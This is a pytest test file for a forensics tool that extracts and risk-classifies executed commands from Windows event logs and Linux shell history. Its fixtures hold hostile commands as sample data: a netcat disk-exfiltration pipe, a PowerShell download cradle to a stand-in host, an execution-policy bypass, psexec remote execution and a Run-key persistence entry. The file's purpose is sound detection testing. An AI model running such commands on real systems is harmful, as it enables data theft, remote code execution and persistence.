from __future__ import annotations

from app.services import command_history


def _event(event_id: int, **overrides):
    base = {
        "id": f"event-{event_id}",
        "case_id": "case-1",
        "evidence_id": "ev-1",
        "@timestamp": "2024-03-22T12:00:00Z",
        "host": {"name": "hosta.examplecorp.local"},
        "user": {"name": "EXAMPLECORP\\usera"},
        "windows": {"event_id": event_id},
        "event": {"provider": "Microsoft-Windows-Sysmon", "channel": "Microsoft-Windows-Sysmon/Operational"},
        "artifact": {"type": "windows_event", "parser": "evtxecmd_csv"},
        "source_file": "Sysmon.evtx",
    }
    base.update(overrides)
    return base


def _linux_shell_hit(doc_id: str, *, command: str, user: str = "root", host: str = "victoria", evidence_id: str = "ev-linux", artifact_id: str = "art-linux", source_file: str = "volume-0/linux/root/.bash_history") -> dict:
    return {
        "_id": doc_id,
        "_source": {
            "case_id": "case-1",
            "evidence_id": evidence_id,
            "artifact_id": artifact_id,
            "@timestamp": None,
            "host": {"name": host, "hostname": host},
            "user": {"name": user},
            "artifact": {"type": "linux_shell_history", "parser": "linux_shell_raw", "name": ".bash_history"},
            "source_file": source_file,
            "event": {"type": "bash_history", "message": command},
            "linux": {
                "artifact_family": "linux_shell_history",
                "artifact_type": "bash_history",
                "source_file": source_file,
                "username": user,
                "hostname": host,
                "command": command,
                "message": command,
            },
            "search_text": f"{command} | {host} | {user} | linux_shell_history | {source_file}",
        },
    }


def test_sysmon_event_id_1_extracts_command_execution() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            1,
            process={
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -ep bypass -File C:\\Users\\Public\\maintenance.ps1",
                "guid": "{PROC-1}",
                "pid": 4444,
                "parent": {"name": "explorer.exe", "command_line": "explorer.exe"},
            },
        ),
    )

    assert len(items) == 1
    item = items[0]
    assert item["source_type"] == "sysmon_1"
    assert item["shell"] == "powershell"
    assert item["shell_family"] == "powershell"
    assert item["launcher"] == "powershell.exe"
    assert item["classification_confidence"] == "high"
    assert "maintenance.ps1" in item["command"]
    assert item["confidence"] == "high"
    assert "PowerShell execution policy bypass" in item["risk_reasons"]


def test_security_4688_extracts_command_execution() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4688,
            event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"},
            process={"name": "cmd.exe", "command_line": "cmd.exe /c whoami", "pid": 1234},
        ),
    )

    assert items[0]["source_type"] == "security_4688"
    assert items[0]["shell"] == "cmd"
    assert items[0]["shell_family"] == "cmd"
    assert items[0]["launcher"] == "cmd.exe"
    assert items[0]["command"] == "cmd.exe /c whoami"
    assert "reconnaissance command" in items[0]["risk_reasons"]


def test_reg_add_command_is_registry_command_evidence_not_confirmed() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4688,
            event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"},
            process={
                "name": "reg.exe",
                "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v KaironLab01Run /d test",
                "pid": 1234,
            },
        ),
    )

    assert items[0]["artifact_type"] == "registry_command"
    assert items[0]["registry_command"]["operation"] == "add"
    assert items[0]["registry_command"]["confidence"] == "command_evidence"
    assert items[0]["registry_command"]["confirmed_by_registry_event"] is False
    assert "registry modification command evidence" in items[0]["risk_reasons"]


def test_powershell_4104_extracts_script_block() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4104,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"},
            powershell={"command": "Invoke-WebRequest http://example-control.test/maintenance.ps1"},
        ),
    )

    assert items[0]["source_type"] == "powershell_operational"
    assert items[0]["shell"] == "powershell"
    assert items[0]["shell_family"] == "powershell"
    assert "download cradle or file transfer utility" in items[0]["risk_reasons"]
    assert "Synthetic indicator" in items[0]["risk_reasons"]


def test_powershell_placeholder_command_falls_back_to_host_application_payload() -> None:
    payload = (
        "Level = Informational, HostName = ConsoleHost, "
        "HostApplication = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
        "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "
        "C:\\Users\\analyst\\Documents\\KaironLab01\\run_key_payload.ps1, "
        "EngineVersion = 5.1, Command Name = run_key_payload.ps1, "
        "User = KAIRON-LAB01\\analyst, ShellId = Microsoft.PowerShell,"
    )

    items = command_history._commands_from_event(
        "case-1",
        _event(
            4103,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"},
            artifact={"type": "powershell", "parser": "powershell_evtx"},
            process={"name": "powershell.exe", "command_line": "0x0", "pid": 8288},
            user={"name": payload},
            windows={
                "event_id": 4103,
                "event_data": {
                        "UserId": "KAIRON-LAB01\\analyst",
                    "payload_columns": {
                        "PayloadData1": f"Command Name: {payload}",
                        "PayloadData2": f"Host Application = {payload}",
                        "PayloadData6": 'Payload: CommandInvocation(run_key_payload.ps1): "run_key_payload.ps1"',
                        "Payload": "0x0",
                    },
                },
            },
        ),
    )

    assert len(items) == 1
    item = items[0]
    assert "powershell.exe" in item["command"]
    assert "run_key_payload.ps1" in item["command"]
    assert item["process"]["command_line"] == ""
    assert item["user"] == "KAIRON-LAB01\\analyst"
    assert "HostApplication" in item["raw_payload"]
    assert "Command Name" not in item["user"]


def test_powershell_placeholder_command_falls_back_to_script_block() -> None:
    items = command_history._commands_from_event(
        "case-1",
        _event(
            4104,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Microsoft-Windows-PowerShell/Operational"},
            artifact={"type": "powershell", "parser": "powershell_evtx"},
            process={"name": "powershell.exe", "command_line": "0x"},
            windows={
                "event_id": 4104,
                "event_data": {
                    "ScriptBlockText": "Write-Host KAIRON-LAB01-MARKER",
                    "User": "KAIRON-LAB01\\analyst",
                },
            },
        ),
    )

    assert items[0]["command"] == "Write-Host KAIRON-LAB01-MARKER"
    assert items[0]["user"] == "KAIRON-LAB01\\analyst"


def test_powershell_json_payload_command_falls_back_to_host_application() -> None:
    raw_json = (
        '{"EventData":{"Data":"Stopped, Available, \\tNewEngineState=Stopped\\n'
        '\\tHostApplication=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe '
        '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File '
        'C:\\\\Users\\\\analyst\\\\Documents\\\\KaironLab01\\\\run_key_payload.ps1\\n'
        '\\tCommandLine=","Binary":""}}'
    )

    items = command_history._commands_from_event(
        "case-1",
        _event(
            403,
            event={"provider": "Microsoft-Windows-PowerShell", "channel": "Windows PowerShell"},
            artifact={"type": "powershell", "parser": "powershell_evtx"},
            process={"name": "powershell.exe", "command_line": raw_json, "pid": 8288},
            windows={
                "event_id": 403,
                "event_data": {
                    "payload_columns": {
                        "PayloadData1": (
                            "HostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "
                            "C:\\Users\\analyst\\Documents\\KaironLab01\\run_key_payload.ps1"
                        ),
                        "Payload": raw_json,
                    },
                },
            },
        ),
    )

    assert len(items) == 1
    assert items[0]["command"].startswith("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
    assert "run_key_payload.ps1" in items[0]["command"]
    assert not items[0]["command"].startswith("{")
    assert items[0]["process"]["command_line"] == ""


def test_dedupes_same_process_guid_and_preserves_supporting_events() -> None:
    first = command_history._commands_from_event(
        "case-1",
        _event(1, id="sysmon", process={"name": "whoami.exe", "command_line": "whoami.exe", "guid": "{GUID-1}"}),
    )[0]
    second = command_history._commands_from_event(
        "case-1",
        _event(
            4688,
            id="security",
            event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"},
            process={"name": "whoami.exe", "command_line": "whoami.exe", "guid": "{GUID-1}"},
        ),
    )[0]

    deduped = command_history._dedupe_commands([second, first])

    assert len(deduped) == 1
    assert deduped[0]["source_type"] == "sysmon_1"
    assert {event["event_id"] for event in deduped[0]["supporting_events"]} == {"sysmon", "security"}


def test_filters_host_alias_risk_and_source_type() -> None:
    item = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "powershell.exe", "command_line": "powershell.exe -ep bypass", "guid": "{GUID-1}"}),
    )[0]

    assert command_history._apply_filters([item], {"host": "HOSTA", "risk_min": 30, "source_type": "sysmon_1"})
    assert command_history._apply_filters([item], {"family": "powershell", "launcher": "powershell"})
    assert command_history._apply_filters([item], {"host": "other"}) == []


def test_get_command_history_uses_search_documents(monkeypatch) -> None:
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(
        command_history,
        "search_documents",
        lambda index, body: {
            "hits": {
                "hits": [
                    {
                        "_id": "event-1",
                        "_source": _event(
                            1,
                            id=None,
                            process={"name": "powershell.exe", "command_line": "powershell.exe -ep bypass", "guid": "{GUID-1}"},
                        ),
                    }
                ]
            }
        },
    )

    response = command_history.get_command_history("case-1", {"host": "HOSTA", "page_size": 10})

    assert response["total"] == 1
    assert response["items"][0]["source_type"] == "sysmon_1"
    assert response["facets"]["shell"]["powershell"] == 1
    assert response["facets"]["family"]["powershell"] == 1
    assert response["facets"]["launcher"]["powershell.exe"] == 1


def test_candidate_query_includes_linux_shell_history(monkeypatch) -> None:
    captured = {}
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")

    def fake_search(index, body):
        captured["index"] = index
        captured["body"] = body
        return {"hits": {"hits": []}}

    monkeypatch.setattr(command_history, "search_documents", fake_search)

    command_history.get_command_history("case-1", {"q": "whoami", "source_category": "Disk", "page_size": 10})

    should = captured["body"]["query"]["bool"]["should"]
    assert {"term": {"artifact.type": "linux_shell_history"}} in should
    # The q text filter must be a required "must" clause, not another
    # "should" option -- see _fetch_candidate_events's comment on why an
    # OR'd text filter is a no-op for narrowing the fetch.
    must = captured["body"]["query"]["bool"]["must"]
    q_clause = [clause for clause in must if "simple_query_string" in clause][0]
    assert "linux.command" in q_clause["simple_query_string"]["fields"]


def test_linux_shell_history_maps_to_command_history_response_model() -> None:
    event = _linux_shell_hit("linux-doc-1", command="dd if=/dev/sda1 | nc 192.168.56.1 4444")["_source"]
    event["id"] = "linux-doc-1"

    items = command_history._commands_from_event("case-1", event)

    assert len(items) == 1
    item = items[0]
    assert item["case_id"] == "case-1"
    assert item["evidence_id"] == "ev-linux"
    assert item["artifact_id"] == "art-linux"
    assert item["parser"] == "linux_shell_raw"
    assert item["artifact_type"] == "linux_shell_history"
    assert item["source_type"] == "linux_shell_history"
    assert item["source_category"] == "Disk"
    assert item["source_plugin_or_parser"] == "linux_shell_raw"
    assert item["source_event_id"] == "linux-doc-1"
    assert item["source_file"] == "volume-0/linux/root/.bash_history"
    assert item["timestamp"] is None
    assert item["timestamp_status"] == "missing"
    assert item["command"] == "dd if=/dev/sda1 | nc 192.168.56.1 4444"
    assert item["host"] == "victoria"
    assert item["user"] == "root"
    assert item["supporting_events"][0]["artifact_id"] == "art-linux"
    assert item["supporting_events"][0]["parser"] == "linux_shell_raw"


def test_linux_shell_history_filtering_and_pagination(monkeypatch) -> None:
    hits = [
        _linux_shell_hit("linux-doc-1", command="whoami", user="root", host="victoria", artifact_id="art-1"),
        _linux_shell_hit("linux-doc-2", command="vim /etc/passwd", user="root", host="VulnOSv2", artifact_id="art-2", source_file="volume-1/linux/root/.bash_history"),
        _linux_shell_hit("linux-doc-3", command="cat .psql_history", user="postgres", host="VulnOSv2", artifact_id="art-3", source_file="volume-1/linux/home/postgres/.bash_history"),
    ]
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})

    filtered = command_history.get_command_history("case-1", {"host": "vulnosv2", "user": "root", "q": "passwd", "family": "linux_shell_history", "source_category": "Disk", "page_size": 1})

    assert filtered["total"] == 1
    assert filtered["items"][0]["command"] == "vim /etc/passwd"
    assert filtered["items"][0]["artifact_id"] == "art-2"
    assert filtered["facets"]["family"]["linux_shell_history"] == 1
    assert filtered["facets"]["source_type"]["linux_shell_history"] == 1

    tokenized = command_history.get_command_history("case-1", {"q": "etc passwd", "family": "linux_shell_history", "source_category": "Disk", "page_size": 10})
    assert tokenized["total"] == 1
    assert tokenized["items"][0]["command"] == "vim /etc/passwd"

    page_two = command_history.get_command_history("case-1", {"family": "linux_shell_history", "source_category": "Disk", "page": 2, "page_size": 2, "sort_by": "timestamp", "sort_order": "asc"})
    assert page_two["total"] == 3
    assert page_two["page"] == 2
    assert [item["source_event_id"] for item in page_two["items"]] == ["linux-doc-1"]


def test_mixed_windows_and_linux_command_history_preserves_windows_behavior(monkeypatch) -> None:
    hits = [
        _hit("event-win", ts="2024-03-22T12:30:00Z", command="powershell.exe -File C:\\new.ps1", pid=2000),
        _linux_shell_hit("linux-doc-1", command="scp yom@192.168.56.1:/home/yom/temporary/exim4/* ."),
    ]
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})

    result = command_history.get_command_history("case-1", {"source_category": "Disk", "page_size": 10})

    assert result["total"] == 2
    assert result["items"][0]["source_type"] == "sysmon_1"
    assert result["items"][1]["source_type"] == "linux_shell_history"
    assert result["items"][0]["windows_event_id"] == "1"
    assert result["facets"]["source_type"]["sysmon_1"] == 1
    assert result["facets"]["source_type"]["linux_shell_history"] == 1


def test_lolbin_remote_exec_discovery_and_prefetch_classification() -> None:
    rundll32 = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "rundll32.exe", "command_line": "rundll32.exe shell32.dll,Control_RunDLL", "guid": "{GUID-R}"}),
    )[0]
    psexec = command_history._commands_from_event(
        "case-1",
        _event(1, process={"name": "cmd.exe", "command_line": r"/c C:\Users\public\psexec.exe \\HOSTB -accepteula powershell -ep bypass", "guid": "{GUID-P}"}),
    )[0]
    whoami = command_history._commands_from_event(
        "case-1",
        _event(4688, event={"provider": "Microsoft-Windows-Security-Auditing", "channel": "Security"}, process={"name": "whoami.exe", "command_line": "whoami.exe", "parent": {"name": "cmd.exe"}}),
    )[0]
    prefetch = command_history._commands_from_event(
        "case-1",
        _event(0, artifact={"type": "prefetch", "parser": "pecmd"}, process={"name": "POWERSHELL.EXE"}, key_entity="POWERSHELL.EXE"),
    )[0]

    assert rundll32["shell_family"] == "lolbin"
    assert psexec["shell_family"] == "remote_exec"
    assert whoami["shell_family"] == "binary_execution"
    assert whoami["parent_shell"] == "cmd"
    assert prefetch["launcher"] == "powershell.exe"
    assert prefetch["shell_family"] == "powershell"
    assert prefetch["classification_confidence"] in {"low", "medium"}


def _hit(doc_id: str, *, ts: str, command: str, pid: int) -> dict:
    return {
        "_id": doc_id,
        "_source": {
            "case_id": "case-1",
            "evidence_id": "ev-1",
            "@timestamp": ts,
            "windows": {"event_id": 1},
            "event": {"channel": "Microsoft-Windows-Sysmon/Operational"},
            "artifact": {"type": "windows_event"},
            "host": {"name": "HOSTA"},
            "user": {"name": "usera"},
            "process": {
                "name": "powershell.exe",
                "executable": "powershell.exe",
                "pid": pid,
                "guid": f"guid-{pid}",
                "command_line": command,
                "parent": {"name": "explorer.exe", "pid": 1000},
            },
            "source_file": "Sysmon.evtx",
        },
    }


def test_command_history_timestamp_sort_asc_desc_and_source_doc_id(monkeypatch) -> None:
    hits = [
        _hit("event-new", ts="2024-03-22T12:30:00Z", command="powershell.exe -File C:\\new.ps1", pid=2000),
        _hit("event-old", ts="2024-03-22T12:00:00Z", command="powershell.exe -File C:\\old.ps1", pid=1000),
    ]

    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})

    asc = command_history.get_command_history("case-1", {"sort_by": "timestamp", "sort_order": "asc", "page_size": 10})
    desc = command_history.get_command_history("case-1", {"sort_by": "timestamp", "sort_order": "desc", "page_size": 10})

    assert asc["sort"] == "timestamp_asc"
    assert asc["sort_order"] == "asc"
    assert [item["source_event_id"] for item in asc["items"]] == ["event-old", "event-new"]
    assert asc["items"][0]["windows_event_id"] == "1"

    assert desc["sort"] == "timestamp_desc"
    assert desc["sort_order"] == "desc"
    assert [item["source_event_id"] for item in desc["items"]] == ["event-new", "event-old"]


def _psreadline_hit(doc_id: str, *, command: str, line_number: int, host: str = "HOSTA", user: str = "usera", source_file: str = "C/Users/usera/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt") -> dict:
    return {
        "_id": doc_id,
        "_source": {
            "case_id": "case-1",
            "evidence_id": "ev-1",
            "@timestamp": None,
            "artifact": {"type": "powershell"},
            "host": {"name": host},
            "user": {"name": user},
            "powershell": {"command": command, "line_number": line_number},
            "source_file": source_file,
        },
    }


def test_undated_psreadline_commands_are_ordered_by_line_number_not_alphabetically(monkeypatch) -> None:
    # ConsoleHost_history.txt has no per-command timestamp -- only line
    # position reflects real execution order (it's append-only). Sorting
    # alphabetically instead (the old behavior) actively scrambles the
    # sequence: "zzz" would sort after "aaa" regardless of which ran first.
    hits = [
        _psreadline_hit("event-3", command="zzz-ran-third", line_number=3),
        _psreadline_hit("event-1", command="aaa-ran-first", line_number=1),
        _psreadline_hit("event-2", command="mmm-ran-second", line_number=2),
    ]
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})
    # get_command_history also merges in memory-sourced commands via a real
    # DB session when no source_category filter narrows to disk-only; stub
    # it out so this test exercises only the disk-event sort logic under
    # test, matching the pre-existing gap tracked for the sibling sort test
    # in known_failures.txt (real DB session + non-UUID test case_id).
    monkeypatch.setattr(command_history, "memory_command_history", lambda *_args, **_kwargs: {"items": []})

    result = command_history.get_command_history("case-1", {"sort_by": "timestamp", "sort_order": "asc", "page_size": 10})

    assert [item["command"] for item in result["items"]] == ["aaa-ran-first", "mmm-ran-second", "zzz-ran-third"]
    assert [item["line_number"] for item in result["items"]] == [1, 2, 3]


def test_undated_psreadline_commands_group_by_source_file_before_line_number(monkeypatch) -> None:
    hits = [
        _psreadline_hit("event-b1", command="b-file-first", line_number=1, user="userb", source_file="C/Users/userb/.../ConsoleHost_history.txt"),
        _psreadline_hit("event-a2", command="a-file-second", line_number=2, user="usera", source_file="C/Users/usera/.../ConsoleHost_history.txt"),
        _psreadline_hit("event-a1", command="a-file-first", line_number=1, user="usera", source_file="C/Users/usera/.../ConsoleHost_history.txt"),
    ]
    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})
    monkeypatch.setattr(command_history, "memory_command_history", lambda *_args, **_kwargs: {"items": []})

    result = command_history.get_command_history("case-1", {"sort_by": "timestamp", "sort_order": "asc", "page_size": 10})

    # Same host ("HOSTA" for all three); each source file's own commands
    # must stay in line-number order and not interleave with the other file.
    assert [item["command"] for item in result["items"]] == ["a-file-first", "a-file-second", "b-file-first"]


def test_command_history_filters_preserve_sort_count(monkeypatch) -> None:
    hits = [
        _hit("event-new", ts="2024-03-22T12:30:00Z", command="powershell.exe -File C:\\new.ps1", pid=2000),
        _hit("event-old", ts="2024-03-22T12:00:00Z", command="cmd.exe /c whoami", pid=1000),
    ]

    monkeypatch.setattr(command_history, "get_events_index", lambda case_id: f"events-{case_id}")
    monkeypatch.setattr(command_history, "search_documents", lambda *_args, **_kwargs: {"hits": {"hits": hits}})

    result = command_history.get_command_history("case-1", {"q": "new.ps1", "sort_by": "timestamp", "sort_order": "desc", "page_size": 10})

    assert result["total"] == 1
    assert result["sort_order"] == "desc"
    assert result["items"][0]["source_event_id"] == "event-new"
    assert "new.ps1" in result["items"][0]["command"]
